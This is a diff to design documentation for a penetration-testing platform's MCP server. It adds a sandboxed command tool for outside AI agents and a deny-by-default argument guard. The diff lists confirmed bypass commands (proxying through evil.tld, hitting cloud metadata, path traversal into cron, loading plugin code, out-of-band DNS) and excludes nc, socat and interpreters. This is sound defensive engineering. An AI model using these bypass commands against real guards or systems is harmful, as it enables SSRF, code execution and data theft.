@@ -11,13 +11,13 @@ set of recon tuning settings, and query the attack-surface graph.
 > | | Direction | Where |
 > | --- | --- | --- |
 > | **MCP Tool Plugins** ([README.MCP.md](README.MCP.md)) | **outbound** — RedAmon is the *client* of servers you register | Global Settings → *MCP Tool Plugins* |
-> | **MCP Inbound** (this document) | **inbound** — other agents are the *clients*, RedAmon is the *server* | Global Settings → *MCP Inbound* |
+> | **MCP Server** (this document) | **inbound** — other agents are the *clients*, RedAmon is the *server* | Global Settings → *MCP Server* |
 
 ---
 
 ## 1. What is and is not exposed
 
-**Exposed (nine tools).**
+**Exposed (thirteen tools).**
 
 | Tool | What it does | Permission |
 | --- | --- | --- |
@@ -27,14 +27,119 @@ set of recon tuning settings, and query the attack-surface graph.
 | `graph_summary` | Count per node type + relationships present. | `recon:read` |
 | `graph_schema` | What the graph *means*. No arguments, no data. | `recon:read` |
 | `query_graph` | Ask the graph a question in natural language. | `recon:read` (+ `graph:cypher` for raw Cypher) |
+| `kali_toolbox` | The Kali sandbox's installed toolset, by category. Reads code, not the container. | `recon:read` |
 | `start_recon` | Start the full recon pipeline. | `recon:scan` (+ `recon:overwrite` for `mode:"overwrite"`) |
 | `stop_recon` | Stop a running scan. | `recon:scan` |
 | `update_recon_settings` | Change allowlisted recon tuning. | `recon:settings` |
+| `kali_exec` | One allowlisted, scope-checked command in the sandbox. Not a shell. | `kali:exec` |
+| `kali_output` | That command's output, paged from a byte cursor. | `kali:exec` |
+| `kali_cancel` | Stop a command it started. | `kali:exec` |
 
-**Deliberately not exposed:** the agent chat, Kali and exploitation tools,
-partial recon, project create/delete/import, secrets and LLM keys, target and
-scope fields, Rules of Engagement, guardrails, GVM/TruffleHog/supply-chain/AI
-attack-surface scan control, and any graph **write**.
+**Deliberately not exposed:** the agent chat, a shell, partial recon, project
+create/delete/import, secrets and LLM keys, target and scope fields, Rules of
+Engagement, guardrails, GVM/TruffleHog/supply-chain/AI attack-surface scan
+control, and any graph **write**.
+
+`kali_toolbox` is served from the `kali_shell` `TOOL_REGISTRY` description via
+the agent's `GET /kali/toolbox` (`require_internal_auth_only`), the same bytes
+the in-app agent is prompted with: one source, so a catalogue cannot promise a
+tool the image does not carry. It never calls the kali-sandbox, holds no
+`MCP_AUTH_TOKEN`, and takes no `projectId`. Most of what it lists is **not**
+reachable through `kali_exec`.
+
+### 1.1 Why `kali_exec` is not `kali_shell`
+
+`kali_shell` is `bash -c` on a container with `NET_ADMIN`, `NET_RAW`,
+`seccomp:unconfined` and open egress. Inside the product that is contained by a
+**human** clicking through the `DANGEROUS_TOOLS` confirmation
+(`REQUIRE_TOOL_CONFIRMATION`, default on). An MCP token has no human, and
+neither existing control covers the gap: the RoE gate
+(`execute_plan_node._check_roe_blocked`) matches on **tool name only** and never
+reads a command string, and the scope guardrail
+(`initialize_node._run_scope_guardrail`) runs once per session against the
+project's *configured* target. Neither would notice `nmap -sS victim.tld`, which
+needs no settings write and so walks straight past the §6 allowlist.
+
+`agentic/kali_exec_guard.py` is what stands in that place, and it is the security
+boundary of the feature; everything else is plumbing.
+
+#### It is deny-by-default over the FLAG surface, and that shape was earned
+
+The first implementation pattern-matched arguments to guess which ones named a
+host and let everything it did not recognise through. An adversarial review broke
+it **ten ways in one pass**, every one the same root cause: *a token the guard
+declined to recognise was a token nobody checked*, and the "a network tool must
+name at least one in-scope host" rule meant one good argument laundered all the
+others. Confirmed bypasses, all now regression-tested in
+`BypassRegressionTests`:
+
+```
+curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/   two colons -> unparsed -> unchecked
+curl -xevil.tld:8080 acme.tld                           attached short value -> skipped entirely
+curl acme.tld evil.tld/                                 a trailing slash -> unparsed
+curl acme.tld 169.254.169.254/latest/meta-data/         cloud metadata
+curl -o /workspace/../etc/cron.d/pwn https://acme.tld/  prefix match, no normalisation
+whatweb --plugins=+/tmp/p.rb https://acme.tld           loads Ruby from a writable dir
+nikto -config /tmp/n.conf -h acme.tld                   config sets PLUGINDIR/EXECDIR/CLIOPTS
+dig @evil.tld acme.tld                                  arbitrary nameserver, out-of-band channel
+curl -K/tmp/c acme.tld                                  config file = arbitrary curl, including file://
+```
+
+So every binary now declares **each flag it accepts and the KIND of value that
+flag takes** (`BOOL` / `HOST` / `PATH` / `OPAQUE` / `RRTYPE`). A token that is not
+in the spec is refused by name. There are no unrecognised tokens left, so there
+is nothing to launder.
+
+| Rule | Refuses |
+| --- | --- |
+| Per-binary flag allowlist, typed values | Every flag not explicitly permitted, including attached short values (`-oFILE`) |
+| Explicit denials with a reason | `--resolve`, `--connect-to`, `-x`, `-K`, `-L`, `--variable`, `--plugins`, `-config`, `--openssl` |
+| Shell metacharacters (`; \| & $ ` `` ` `` ` > < ( ) \` + newline) | Pipelines, chaining, substitution, redirection |
+| `shlex.split`, `argv[0]` has no `/` | Path-qualified or unparseable programs |
+| Every HOST-typed value resolved, then scope- and RoE-checked | An out-of-scope target, in any syntax: path, userinfo, IPv6 literal, IDN lookalike |
+| URL scheme is http(s) | `file://` (local read), `gopher://`/`dict://` (SSRF) |
+| PATH values normalised, then confined | `..` traversal, relative paths, and **another project's** workspace subtree |
+| A network binary must name a target | A command whose target is implied and so cannot be checked |
+| Injected bounds the caller cannot drop | `--max-filesize`, `--max-time`, `--proto` on every curl |
+
+**The binary rule is: read-only observers whose flags cannot load or run code.**
+That is why `nmap` (`--script`), `sqlmap` (`--eval`), `nuclei` (`-t`),
+`nc`/`socat`, `openssl` (`engine` loads shared objects) and every interpreter are
+absent despite being installed. `test_kali_exec_guard.py` asserts each stays out,
+so adding one is a deliberate act with a red test in front of it.
+
+**Two things it cannot do, by construction.** A pre-flight string check cannot
+see a redirect or a DNS answer, so `-L` is denied (the target would choose the
+next hop) and a hostile in-scope DNS record still resolves where it likes.
+Closing that class needs a runtime egress policy on the *resolved IP*, which
+`scanners/capture_proxy/egress.py` already implements for the capture path.
+Routing this egress through it would make the class unreachable even when the
+parser is wrong, which it will be again. **Tracked, not done.**
+
+Two things do the real work and are easy to mistake for each other. The
+metacharacter check gives an early, legible refusal; the thing that actually
+makes the transport safe is `shlex.join` re-quoting **every** argument before it
+reaches `kali_shell`'s `bash -c` (the same fix as the `shlex.quote` in the
+`/files` reader). The admitted, re-quoted form is what is echoed back and
+audited, not what the caller typed.
+
+Everything fails closed. An unreadable scope refuses rather than running
+unchecked, an unconfigured project refuses rather than treating "no scope" as
+"no limit", and the guard runs **only** in the agent: the webapp never inspects
+or rewrites a command, because a second copy of these rules is the copy that
+drifts.
+
+Four independent switches must all be on, each owned by a different
+decision-maker so no single compromise enables this:
+
+1. `MCP_KALI_EXEC_ENABLED` — deployment, default off *even when the MCP server
+   is on*, wired into the webapp compose `environment:` block (no `env_file`).
+2. the `kali:exec` scope — mint-time, password-confirmed, off by default.
+3. `project.mcpKaliExecEnabled` — a human in the project form, per engagement.
+   Classified `'escalation'` in the settings denylist, so `update_recon_settings`
+   refuses it **by name**: a token can never grant itself this. A row missing the
+   column, or one that cannot be read, is not consent.
+4. a configured target — nothing to scope-check against otherwise.
 
 ---
 
@@ -68,6 +173,8 @@ and a value set only in `.env` would be silently inert.
 | Variable | Default | Meaning |
 | --- | --- | --- |
 | `MCP_SERVER_ENABLED` | `false` | The master switch. |
+| `MCP_KALI_EXEC_ENABLED` | `false` | `kali_exec` / `kali_output` / `kali_cancel`. Independent of the master switch on purpose. |
+| `MCP_RATE_EXEC_PER_MIN` | `20` | `kali_exec` calls per token per minute. Polling uses the read bucket. |
 | `MCP_TOKEN_RETENTION_DAYS` | `90` | How long revoked/expired token rows are kept before pruning. |
 | `MCP_RATE_READ_PER_MIN` | `120` | Cheap reads per token per minute. |
 | `MCP_RATE_QUERY_PER_MIN` | `20` | `query_graph` calls per token per minute. |
@@ -84,13 +191,13 @@ Agent-side bounds (the agent **does** have an `env_file`, so `.env` reaches it):
 
 ## 3. Minting a token
 
-**Global Settings → MCP Inbound → New token.**
+**Global Settings → MCP Server → New token.**
 
 - **Minting is self-only**, judged on your real login identity. An admin viewing
   another user's settings sees the form disabled with a reason: a token minted
   that way would outlive the act-as session, need no further authentication, and
-  be indistinguishable from the user's own calls. Admins *can* list and revoke —
-  revoking is a safe privilege; minting is not.
+  be indistinguishable from the user's own calls. Admins *can* list, narrow and revoke;
+  taking power away is a safe privilege, adding it is not.
 - It asks for your **password again**. A stolen 7-day session cookie must not
   silently become a credential that outlives logout.
 - **Permissions default to read-only.** Every write permission is opt-in, and
@@ -100,6 +207,25 @@ Agent-side bounds (the agent **does** have an `env_file`, so `.env` reaches it):
   revocation take effect mid-session rather than at the client's next reconnect.
 - The token is shown **once**. Afterwards only its first 8 characters are ever
   displayed.
+
+**Editing a token** (`PATCH /api/users/[id]/mcp-tokens/[tokenId]`) changes its
+name, scopes and expiry (`expiry`: `30|60|90|365`, `"never"`, `"now"`, or a
+`YYYY-MM-DD` date that lasts to the end of that day UTC). The hash and owner are
+never mutable, and a revoked token can only be renamed. Edits are judged by
+**direction**:
+
+- **Narrowing** (drop a scope, earlier expiry, `"now"`, rename) keeps the admin
+  bypass, like revoke.
+- **Widening** (add a scope, later or no expiry, reviving an expired token) gets
+  the mint's step-up: self-only on the real identity, password re-confirmed, and
+  the same limiter key as minting, so the two share one attempt budget. Without
+  this a stolen session cookie could upgrade an existing token into the
+  credential it cannot mint. `isTokenWidening` in `webapp/src/lib/mcpAuth.ts` is
+  the single rule, used by both the route and the tab.
+
+Scopes and expiry are re-read on every MCP call, so an edit applies on the
+agent's next call. Capability edits audit as `mcp-token.update` with
+before/after values and `widened`.
 
 **Any password change revokes every token** for that user, including an admin
 reset (which needs no current password). A reset that left live programmatic
@@ -266,6 +392,9 @@ server's tools. Assume an instruction embedded in a page title reaches the model
 | Escalate scan aggression | Every intrusiveness toggle is denied. |
 | Exfiltrate another tenant's data | Ownership check + `scope_query` + result post-validation. |
 | Exfiltrate secrets | No tool returns a credential. |
+| Aim a command at a third party | `kali_exec` scope-checks every host the command names, before it runs. |
+| Smuggle a second command | Allowlist admits nothing that loads or runs code; `shlex.join` re-quotes every argument. |
+| Read the sandbox's own environment or keys | No interpreter or shell is allowlisted, and paths are confined to `/tmp/` and `/workspace/`. |
 | Burn the owner's LLM budget | Per-token daily budget. |
 
 The residual: a compromised external agent can do, within one user's own
@@ -324,4 +453,5 @@ against `audit_log`. Known and accepted; a minimal admin view is a follow-up.
 
 - [README.MCP.md](README.MCP.md) — the outbound direction (system MCP servers + MCP Tool Plugins)
 - [README.GRAPH_DB.md](README.GRAPH_DB.md) — the attack-surface graph
-- [GRAPH.SCHEMA.md](GRAPH.SCHEMA.md) — node labels and relationships
+- [graph_db/schema_sections.md](../../graph_db/schema_sections.md) — the node labels and relationships `graph_schema` serves
+- [GRAPH.SCHEMA.md](GRAPH.SCHEMA.md) — why the graph is shaped this way (lists no labels)
